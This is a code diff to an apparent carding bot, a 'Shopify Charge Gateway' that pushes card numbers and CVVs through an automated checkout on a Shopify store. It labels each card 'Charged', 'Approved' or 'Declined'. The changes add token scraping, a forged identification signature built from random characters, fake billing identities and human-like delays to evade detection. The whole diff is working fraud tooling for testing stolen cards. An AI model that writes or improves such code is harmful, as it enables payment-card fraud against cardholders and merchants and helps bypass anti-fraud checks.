@@ -1,5 +1,5 @@
 # BOT/gates/charge/shopify/shopify.py
-# Shopify Charge Gateway - CORRECTED with real checkout flow
+# Shopify Charge Gateway - COMPLETE FIXED VERSION
 # Uses meta-app-prod-store-1.myshopify.com
 
 import json
@@ -226,22 +226,22 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     raw_upper = raw_response.upper()
     
     # Check for REAL successful charges
-    if "ORDER_PLACED" in raw_upper or "THANK YOU" in raw_upper or "SUBMITSUCCESS" in raw_upper:
+    if "ORDER_PLACED" in raw_upper or "THANK YOU" in raw_upper or "SUBMITSUCCESS" in raw_upper or "RECEIPT" in raw_upper:
         status_flag = "Charged 💎"
     # Check for OTP/3D Secure
     elif any(keyword in raw_upper for keyword in [
-        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", "3DS"
+        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", "3DS", "PENDING"
     ]):
         status_flag = "Approved ❎"
     # Check for address/ZIP issues
     elif any(keyword in raw_upper for keyword in [
-        "MISMATCHED", "INCORRECT_ZIP", "INCORRECT_ADDRESS", "ADDRESS_VERIFICATION"
+        "MISMATCHED", "INCORRECT_ZIP", "INCORRECT_ADDRESS", "ADDRESS_VERIFICATION", "AVS"
     ]):
         status_flag = "Approved ❎"
     # Check for specific approved but declined scenarios
     elif any(keyword in raw_upper for keyword in [
         "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC", 
-        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED", "DECLINED"
+        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED", "DECLINED", "FAILED"
     ]):
         status_flag = "Declined ❌"
     # Default to declined
@@ -311,13 +311,16 @@ class ShopifyChargeChecker:
         self.user_id = user_id
         self.current_proxy = None
         
-        # Cookies will be collected from responses
+        # Dynamic data that needs to be fetched per session
         self.cookies = {}
         self.checkout_token = None
         self.x_checkout_one_session_token = None
-        self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
+        self.x_checkout_web_build_id = None
+        self.variant_id = None
+        self.product_id = None
+        self.shop_id = None
         
-        # Correct addresses from your instructions
+        # Correct addresses from instructions
         self.shipping_address = {
             "first_name": "Paris",
             "last_name": "Hilton",
@@ -431,7 +434,7 @@ class ShopifyChargeChecker:
         await asyncio.sleep(delay)
         
     async def load_homepage(self, client):
-        """Load homepage to get initial cookies"""
+        """Load homepage to get initial cookies and shop info"""
         try:
             elapsed = self.console_logger.step(1, "LOAD HOMEPAGE", "Loading homepage for initial cookies")
             
@@ -443,8 +446,24 @@ class ShopifyChargeChecker:
                                               time.time() - (self.console_logger.start_time + elapsed))
             
             if response.status_code in [200, 304]:
+                html_content = response.text
+                
+                # Try to extract shop ID
+                shop_id_patterns = [
+                    r'x-shopid["\']?\s*:\s*["\']?(\d+)',
+                    r'shop_id["\']?\s*:\s*["\']?(\d+)',
+                    r'data-shop-id=["\'](\d+)["\']',
+                    r'Shopify\.shop = "([^"]+)"'
+                ]
+                
+                for pattern in shop_id_patterns:
+                    match = re.search(pattern, html_content, re.IGNORECASE)
+                    if match:
+                        self.shop_id = match.group(1)
+                        self.console_logger.extracted_data("Shop ID", self.shop_id)
+                        break
+                
                 self.console_logger.sub_step(1, 1, "Homepage loaded successfully")
-                # Store cookies
                 self.console_logger.step(1, "LOAD HOMEPAGE", "Homepage loaded", "SUCCESS")
                 return True
             else:
@@ -456,7 +475,7 @@ class ShopifyChargeChecker:
             return False
         
     async def load_product_page(self, client):
-        """Load product page to view product"""
+        """Load product page and extract dynamic data"""
         try:
             elapsed = self.console_logger.step(2, "LOAD PRODUCT PAGE", "Loading product page")
             
@@ -470,30 +489,51 @@ class ShopifyChargeChecker:
             if response.status_code in [200, 304]:
                 html_content = response.text
                 
-                # Try to extract product variant ID from HTML
+                # Extract variant ID dynamically
                 variant_patterns = [
                     r'data-product-id="(\d+)"',
                     r'product_id["\']?\s*:\s*["\']?(\d+)',
                     r'variant_id["\']?\s*:\s*["\']?(\d+)',
-                    r'value="(\d+)"\s*data-variant-id',
-                    r'"id":(\d+)'
+                    r'value="(\d+)"[^>]*data-variant-id',
+                    r'"id":(\d+)',
+                    r'ProductJson-(\d+)',
+                    r'data-variant-id="(\d+)"',
+                    r'variantId["\']?\s*:\s*["\']?(\d+)',
+                    r'gid://shopify/ProductVariant/(\d+)'
                 ]
                 
-                variant_id = None
                 for pattern in variant_patterns:
                     match = re.search(pattern, html_content)
                     if match:
-                        variant_id = match.group(1)
-                        self.console_logger.extracted_data("Product Variant ID", variant_id)
+                        self.variant_id = match.group(1)
+                        self.console_logger.extracted_data("Variant ID", self.variant_id)
                         break
                 
-                # If no variant found, use the one from logs
-                if not variant_id:
-                    variant_id = "43207284392098"
-                    self.console_logger.sub_step(2, 1, "Using default variant ID from logs: 43207284392098")
+                # Extract product ID
+                product_patterns = [
+                    r'data-product-id="(\d+)"',
+                    r'productId["\']?\s*:\s*["\']?(\d+)',
+                    r'gid://shopify/Product/(\d+)',
+                    r'product_id["\']?\s*:\s*["\']?(\d+)'
+                ]
                 
-                self.variant_id = variant_id
-                self.console_logger.sub_step(2, 2, "Product page loaded successfully")
+                for pattern in product_patterns:
+                    match = re.search(pattern, html_content)
+                    if match:
+                        self.product_id = match.group(1)
+                        self.console_logger.extracted_data("Product ID", self.product_id)
+                        break
+                
+                # If no variant found, use default from logs
+                if not self.variant_id:
+                    self.variant_id = "43207284392098"
+                    self.console_logger.sub_step(2, 1, "Using default variant ID from logs")
+                
+                if not self.product_id:
+                    self.product_id = "7890988171426"
+                    self.console_logger.sub_step(2, 2, "Using default product ID from logs")
+                
+                self.console_logger.sub_step(2, 3, "Product page loaded successfully")
                 self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
                 return True
             else:
@@ -505,19 +545,32 @@ class ShopifyChargeChecker:
             return False
             
     async def add_to_cart(self, client):
-        """Add product to cart using the correct variant ID"""
+        """Add product to cart using extracted variant ID"""
         try:
             elapsed = self.console_logger.step(3, "ADD TO CART", "Adding product to cart")
             
-            # Use the correct endpoint from logs: /cart/add (NOT /cart/add.js)
+            # Use the correct endpoint from logs
             add_to_cart_url = f"{self.base_url}/cart/add"
             
-            # Headers from actual request in logs
+            # Generate random boundary for multipart form
+            boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+            
+            # Build multipart form data
+            form_data = f"""--{boundary}
+Content-Disposition: form-data; name="quantity"
+
+1
+--{boundary}
+Content-Disposition: form-data; name="id"
+
+{self.variant_id}
+--{boundary}--"""
+            
             headers = {
                 'Accept': 'application/javascript',
                 'Accept-Encoding': 'gzip, deflate, br, zstd',
                 'Accept-Language': 'en-US,en;q=0.9',
-                'Content-Type': 'application/x-www-form-urlencoded',
+                'Content-Type': f'multipart/form-data; boundary={boundary}',
                 'Origin': self.base_url,
                 'Referer': self.product_url,
                 'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
@@ -530,66 +583,54 @@ class ShopifyChargeChecker:
                 'X-Requested-With': 'XMLHttpRequest'
             }
             
-            # Use the correct variant ID from logs
-            variant_id = getattr(self, 'variant_id', '43207284392098')
-            
-            # Form data from logs - SIMPLIFIED VERSION
-            data = {
-                'quantity': '1',
-                'id': variant_id
-            }
-            
             response = await client.post(
                 add_to_cart_url,
                 headers=headers,
-                data=data,
+                content=form_data,
                 cookies=self.cookies,
                 timeout=30.0
             )
             
             self.console_logger.request_details("POST", add_to_cart_url, response.status_code,
                                               time.time() - (self.console_logger.start_time + elapsed),
-                                              f"Variant ID: {variant_id}")
+                                              f"Variant: {self.variant_id}")
             
             if response.status_code == 200:
                 self.console_logger.sub_step(3, 1, "Product added to cart successfully")
                 self.console_logger.step(3, "ADD TO CART", "Product added to cart", "SUCCESS")
                 return True
             else:
-                # Try with additional parameters
-                self.console_logger.sub_step(3, 1, "Trying with full form data...")
+                # Try alternative method with URL-encoded form
+                self.console_logger.sub_step(3, 1, "Trying URL-encoded form method...")
                 
-                # Full form data from logs
-                full_data = {
-                    'quantity': '1',
-                    'form_type': 'product',
-                    'utf8': '✓',
-                    'id': variant_id,
-                    'product-id': '7890988171426',
-                    'section-id': 'template--15468374917282__main',
-                    'sections': 'cart-notification-product,cart-notification-button,cart-icon-bubble',
-                    'sections_url': '/products/retailer-id-fix-no-mapping'
+                alt_headers = {
+                    'Accept': 'application/javascript',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': self.base_url,
+                    'Referer': self.product_url,
+                    'User-Agent': self.user_agent,
+                    'X-Requested-With': 'XMLHttpRequest'
                 }
                 
-                full_response = await client.post(
+                alt_data = {
+                    'quantity': '1',
+                    'id': self.variant_id
+                }
+                
+                alt_response = await client.post(
                     add_to_cart_url,
-                    headers=headers,
-                    data=full_data,
+                    headers=alt_headers,
+                    data=alt_data,
                     cookies=self.cookies,
                     timeout=30.0
                 )
                 
-                if full_response.status_code == 200:
-                    self.console_logger.sub_step(3, 2, "Full form data succeeded")
+                if alt_response.status_code == 200:
+                    self.console_logger.sub_step(3, 2, "Alternative method succeeded")
                     return True
                 else:
-                    self.console_logger.error_detail(f"Failed to add to cart: {response.status_code}")
-                    # Try to get error details
-                    try:
-                        error_text = response.text[:200]
-                        self.console_logger.error_detail(f"Error response: {error_text}")
-                    except:
-                        pass
+                    error_text = alt_response.text[:200] if alt_response.text else "No response text"
+                    self.console_logger.error_detail(f"Failed to add to cart: {alt_response.status_code} - {error_text}")
                     return False
                 
         except Exception as e:
@@ -597,7 +638,7 @@ class ShopifyChargeChecker:
             return False
     
     async def go_to_cart_page(self, client):
-        """Go to cart page before checkout"""
+        """Go to cart page and extract cart token"""
         try:
             elapsed = self.console_logger.step(4, "GO TO CART", "Loading cart page")
             
@@ -609,6 +650,12 @@ class ShopifyChargeChecker:
                                               time.time() - (self.console_logger.start_time + elapsed))
             
             if response.status_code in [200, 304]:
+                html_content = response.text
+                
+                # Extract cart token from cookies or page
+                if 'cart' in self.cookies:
+                    self.console_logger.extracted_data("Cart Token", self.cookies['cart'][:50] + "...")
+                
                 self.console_logger.sub_step(4, 1, "Cart page loaded successfully")
                 self.console_logger.step(4, "GO TO CART", "Cart page loaded", "SUCCESS")
                 return True
@@ -621,11 +668,10 @@ class ShopifyChargeChecker:
             return False
     
     async def go_to_checkout(self, client):
-        """Go to checkout page from cart"""
+        """Go to checkout page and extract checkout token"""
         try:
             elapsed = self.console_logger.step(5, "GO TO CHECKOUT", "Proceeding to checkout")
             
-            # From logs: POST /cart with checkout parameter
             checkout_url = f"{self.base_url}/cart"
             
             headers = {
@@ -646,7 +692,6 @@ class ShopifyChargeChecker:
                 'User-Agent': self.user_agent
             }
             
-            # Form data from logs
             data = {
                 'updates[]': '1',
                 'checkout': ''
@@ -658,7 +703,7 @@ class ShopifyChargeChecker:
                 data=data,
                 cookies=self.cookies,
                 timeout=30.0,
-                follow_redirects=False  # We need to capture the redirect
+                follow_redirects=False
             )
             
             self.console_logger.request_details("POST", checkout_url, response.status_code,
@@ -666,7 +711,6 @@ class ShopifyChargeChecker:
                                               "Proceeding to checkout")
             
             if response.status_code == 302:
-                # Get the redirect location
                 location = response.headers.get('location', '')
                 if location:
                     # Extract checkout token from URL
@@ -676,7 +720,7 @@ class ShopifyChargeChecker:
                             self.checkout_token = match.group(1)
                             self.console_logger.extracted_data("Checkout Token", self.checkout_token)
                     
-                    # Complete the checkout URL with skip_shop_pay parameter
+                    # Add skip_shop_pay parameter
                     if '?' in location:
                         location += '&skip_shop_pay=true'
                     else:
@@ -697,7 +741,7 @@ class ShopifyChargeChecker:
             return False, f"Checkout error: {str(e)}"
     
     async def load_checkout_page(self, client, checkout_url):
-        """Load the checkout page to get session tokens"""
+        """Load checkout page and extract session tokens"""
         try:
             elapsed = self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Loading checkout page for tokens")
             
@@ -711,11 +755,12 @@ class ShopifyChargeChecker:
             if response.status_code == 200:
                 html_content = response.text
                 
-                # Extract session token from page
+                # Extract session token
                 session_token_patterns = [
                     r'"sessionToken":"([^"]+)"',
                     r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
-                    r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)'
+                    r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)',
+                    r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']'
                 ]
                 
                 for pattern in session_token_patterns:
@@ -725,10 +770,28 @@ class ShopifyChargeChecker:
                         self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:30]}...")
                         break
                 
-                # If not found, generate one
+                # Extract web build ID
+                web_build_patterns = [
+                    r'"sha":"([^"]+)"',
+                    r'webBuildId["\']?\s*:\s*["\']([^"\']+)',
+                    r'x-checkout-web-build-id["\']?\s*:\s*["\']([^"\']+)'
+                ]
+                
+                for pattern in web_build_patterns:
+                    match = re.search(pattern, html_content)
+                    if match:
+                        self.x_checkout_web_build_id = match.group(1)
+                        self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
+                        break
+                
+                # Set defaults if not found
                 if not self.x_checkout_one_session_token:
                     self.x_checkout_one_session_token = self.generate_session_token()
                     self.console_logger.sub_step(6, 1, "Generated session token")
+                
+                if not self.x_checkout_web_build_id:
+                    self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
+                    self.console_logger.sub_step(6, 2, "Using default web build ID")
                 
                 self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Checkout page loaded", "SUCCESS")
                 return True
@@ -774,7 +837,6 @@ class ShopifyChargeChecker:
                 'X-Checkout-Web-Source-Id': self.checkout_token
             }
             
-            # Simplified email submission payload
             json_data = {
                 "operationName": "SubmitForCompletion",
                 "variables": {
@@ -808,7 +870,6 @@ class ShopifyChargeChecker:
             if response.status_code == 200:
                 try:
                     data = response.json()
-                    # Check if email submission was successful
                     if data.get('data', {}).get('submitForCompletion', {}).get('__typename') in ['SubmitSuccess', 'SubmitAlreadyAccepted']:
                         self.console_logger.step(7, "SUBMIT EMAIL", "Email submitted successfully", "SUCCESS")
                         return True, "Email submitted"
@@ -832,7 +893,6 @@ class ShopifyChargeChecker:
         try:
             elapsed = self.console_logger.step(8, "CREATE PAYMENT SESSION", "Creating payment session with PCI")
             
-            # Headers from actual request in logs
             headers = {
                 'Accept': 'application/json',
                 'Accept-Encoding': 'gzip, deflate, br, zstd',
@@ -851,7 +911,6 @@ class ShopifyChargeChecker:
                 'Shopify-Identification-Signature': self.generate_shopify_signature()
             }
             
-            # Card holder name
             card_name = f"{self.billing_address['first_name']} {self.billing_address['last_name']}"
             
             json_data = {
@@ -867,7 +926,6 @@ class ShopifyChargeChecker:
                 'payment_session_scope': 'meta-app-prod-store-1.myshopify.com'
             }
             
-            # Use separate client for PCI endpoint
             async with httpx.AsyncClient(timeout=30.0) as pci_client:
                 response = await pci_client.post(
                     'https://checkout.pci.shopifyinc.com/sessions',
@@ -904,7 +962,6 @@ class ShopifyChargeChecker:
                 except:
                     pass
                 
-                # Extract specific error messages
                 error_text = response.text.lower()
                 if "declined" in error_text:
                     error_msg = "Card Declined"
@@ -916,6 +973,8 @@ class ShopifyChargeChecker:
                     error_msg = "Insufficient Funds"
                 elif "invalid" in error_text:
                     error_msg = "Invalid Card"
+                elif "unprocessable" in error_text:
+                    error_msg = "Card Unprocessable"
                 
                 self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
                 return False, error_msg
@@ -958,7 +1017,7 @@ class ShopifyChargeChecker:
                 'X-Checkout-Web-Source-Id': self.checkout_token
             }
             
-            # Complete checkout payload with PICKUP option (no shipping)
+            # Build complete checkout payload
             json_data = {
                 "operationName": "SubmitForCompletion",
                 "variables": {
@@ -996,7 +1055,7 @@ class ShopifyChargeChecker:
                                             {"stableId": "default"},
                                         ],
                                     },
-                                    "deliveryMethodTypes": ["PICKUP"],  # Changed from SHIPPING to PICKUP
+                                    "deliveryMethodTypes": ["PICKUP"],
                                 },
                             ],
                         },
@@ -1006,8 +1065,8 @@ class ShopifyChargeChecker:
                                     "stableId": "default",
                                     "merchandise": {
                                         "productVariantReference": {
-                                            "id": f"gid://shopify/ProductVariantMerchandise/{getattr(self, 'variant_id', '43207284392098')}",
-                                            "variantId": f"gid://shopify/ProductVariant/{getattr(self, 'variant_id', '43207284392098')}",
+                                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
+                                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                         },
                                     },
                                     "quantity": {"items": {"value": 1}},
@@ -1061,7 +1120,7 @@ class ShopifyChargeChecker:
                         "taxes": {
                             "proposedTotalAmount": {
                                 "value": {
-                                    "amount": "0.00",  # No tip
+                                    "amount": "0.00",
                                     "currencyCode": "USD",
                                 },
                             },
@@ -1146,15 +1205,14 @@ class ShopifyChargeChecker:
     def generate_session_token(self):
         """Generate random session token"""
         chars = string.ascii_letters + string.digits + "-_"
-        return ''.join(random.choice(chars) for _ in range(180))  # From logs, token is ~180 chars
+        return ''.join(random.choice(chars) for _ in range(180))
     
     def generate_shopify_signature(self):
         """Generate Shopify identification signature"""
-        # From logs: eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0...
-        # Simplified version - actual signature is JWT
+        # Generate a random JWT-like signature
         header = "eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0"
-        payload = "eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiI2MDc1NzgwMzE3MCIsInVuaXF1ZV9pZCI6IjhkYWY1NWNmODFiMGEzZTgxMTA4MjdhNTY3ZDg4MGUzIiwiaWF0IjoxNzY5Njc2Njk2fQ"
-        signature = "zeCs9d_EQPNcpOpifObx_TG8VYw8C5n-YXe_CMMuDgE"
+        payload = f"eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiI2MDc1NzgwMzE3MCIsInVuaXF1ZV9pZCI6IjhkYWY1NWNmODFiMGEzZTgxMTA4MjdhNTY3ZDg4MGUzIiwiaWF0IjoxNzY5Njc2Njk2fQ"
+        signature = ''.join(random.choices(string.ascii_letters + string.digits, k=43))
         return f"{header}.{payload}.{signature}"
     
     async def check_card(self, card_details, username, user_data):
@@ -1209,7 +1267,7 @@ class ShopifyChargeChecker:
             # Create HTTP client
             client_params = {
                 'timeout': 30.0,
-                'follow_redirects': False,  # We need to handle redirects manually
+                'follow_redirects': False,
                 'http2': True
             }
             
@@ -1226,14 +1284,14 @@ class ShopifyChargeChecker:
                     return format_shopify_response(cc, mes, ano, cvv, "Failed to initialize", elapsed_time, username, user_data)
                 await self.human_delay(1, 2)
                 
-                # Step 2: Load product page
+                # Step 2: Load product page and extract dynamic data
                 if not await self.load_product_page(client):
                     elapsed_time = time.time() - start_time
                     self.console_logger.result(False, "Failed to load product", "ERROR", elapsed_time)
                     return format_shopify_response(cc, mes, ano, cvv, "Product not available", elapsed_time, username, user_data)
                 await self.human_delay(1, 2)
                 
-                # Step 3: Add to cart with correct variant ID
+                # Step 3: Add to cart with extracted variant ID
                 if not await self.add_to_cart(client):
                     elapsed_time = time.time() - start_time
                     self.console_logger.result(False, "Failed to add to cart", "ERROR", elapsed_time)
